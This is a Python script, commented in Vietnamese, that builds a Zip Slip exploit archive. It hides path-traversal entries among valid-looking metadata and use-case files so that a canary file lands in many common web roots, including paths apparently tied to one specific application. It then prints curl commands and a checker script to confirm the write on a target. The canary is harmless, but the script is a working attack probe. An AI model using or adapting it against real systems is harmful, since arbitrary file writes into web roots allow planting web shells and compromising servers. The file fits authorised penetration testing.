"""
Zip Slip — ghi file text vào web root để confirm path traversal.
Tạo 1 ZIP duy nhất với nhiều depth + nhiều web root phổ biến cùng lúc.
Sau khi import, curl từng URL để xem cái nào trả về file.

Usage:
    python zipslip_webroot.py --output probe.zip
    python zipslip_webroot.py --webroot /opt/kian/app/static --output probe.zip
"""

import zipfile
import argparse
import json
import itertools

CANARY_CONTENT = b"ZIPSLIP_CONFIRMED\n"
CANARY_FILENAME = "zipslip_probe.txt"

# Web root phổ biến cho Java / Spring Boot / Nginx trên Linux
DEFAULT_WEBROOTS = [
    "/var/www/html",
    "/var/www",
    "/opt/kian/app/static",
    "/opt/kian/public",
    "/opt/kian/web",
    "/opt/kian/webapp",
    "/usr/share/nginx/html",
    "/app/static",
    "/app/public",
    "/webapps/ROOT",
    "/opt/tomcat/webapps/ROOT",
    "/usr/local/tomcat/webapps/ROOT",
]

TRAVERSAL_PATTERNS = ["../", "..\\", "....//"]

DEPTHS = list(range(2, 12))  # thử depth 2 → 11

VALID_METADATA = json.dumps({
    "author": "admin",
    "content_type": "v2",
    "description": "release_note.md",
    "product_version": "3.5.0",
    "release_timestamp": 1788835703,
    "tenant": "Master",
    "version": "2.0.3",
}, indent=2).encode()

VALID_USECASE = b"""id: 016fc1d8-7c55-4a96-8385-b66efe10348c
business_id: test
core_id: 1
name: Test Use Case
description: test
type: Default
"""


def make_entry_name(pattern: str, depth: int, webroot: str) -> str:
    traversal = pattern * depth
    # Bỏ dấu / đầu webroot, chuẩn hóa sang forward slash
    root = webroot.lstrip("/\\").replace("\\", "/")
    return f"{traversal}{root}/{CANARY_FILENAME}"


def generate(output: str, webroots: list[str]):
    entries = []

    for pattern, depth, webroot in itertools.product(TRAVERSAL_PATTERNS, DEPTHS, webroots):
        arc_name = make_entry_name(pattern, depth, webroot)
        entries.append(arc_name)

    with zipfile.ZipFile(output, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("metadata.json", VALID_METADATA)
        zf.writestr("release_note.md", b"<p>test</p>")
        zf.writestr("use-case/016fc1d8-7c55-4a96-8385-b66efe10348c.yml", VALID_USECASE)

        seen = set()
        for arc_name in entries:
            if arc_name in seen:
                continue
            seen.add(arc_name)
            info = zipfile.ZipInfo(arc_name)
            info.compress_type = zipfile.ZIP_DEFLATED
            zf.writestr(info, CANARY_CONTENT)

    print(f"[+] Created: {output}")
    print(f"[+] Entries: {len(seen)} path traversal variants")
    print(f"[+] Covering {len(webroots)} web roots x {len(DEPTHS)} depths x {len(TRAVERSAL_PATTERNS)} patterns\n")

    print("=" * 60)
    print("Sau khi import ZIP, curl từng URL sau để confirm:")
    print("(Thay 'http://target' bằng địa chỉ thực của ứng dụng)\n")

    for webroot in webroots:
        # Đường dẫn URL: bỏ phần /opt/kian/app hoặc /var/www nếu trùng doc root
        # Thử cả path đầy đủ lẫn chỉ filename
        print(f"curl http://target/{CANARY_FILENAME}")

    print()
    print("Hoặc dùng script verify bên dưới:")
    print(f"""
import requests

TARGET = "http://target"   # <-- đổi thành URL thực
paths_to_check = [
    "/{filename}",
    "/static/{filename}",
    "/public/{filename}",
    "/app/{filename}",
].copy()

for p in [f"/{CANARY_FILENAME}", f"/static/{CANARY_FILENAME}",
          f"/public/{CANARY_FILENAME}", f"/app/{CANARY_FILENAME}"]:
    try:
        r = requests.get(TARGET + p, timeout=5, verify=False)
        if r.status_code == 200 and b"ZIPSLIP_CONFIRMED" in r.content:
            print(f"[!!!] ZIPSLIP CONFIRMED via {{TARGET}}{{p}}")
            break
        else:
            print(f"[ ] {{r.status_code}} {{p}}")
    except Exception as e:
        print(f"[ERR] {{p}}: {{e}}")
""".replace("{filename}", CANARY_FILENAME))


def main():
    parser = argparse.ArgumentParser(description="Zip Slip web root probe")
    parser.add_argument("--output", default="zipslip_probe.zip", help="Tên file ZIP đầu ra")
    parser.add_argument("--webroot", help="Chỉ định 1 web root cụ thể (mặc định thử nhiều path)")
    args = parser.parse_args()

    webroots = [args.webroot] if args.webroot else DEFAULT_WEBROOTS
    generate(args.output, webroots)


if __name__ == "__main__":
    main()
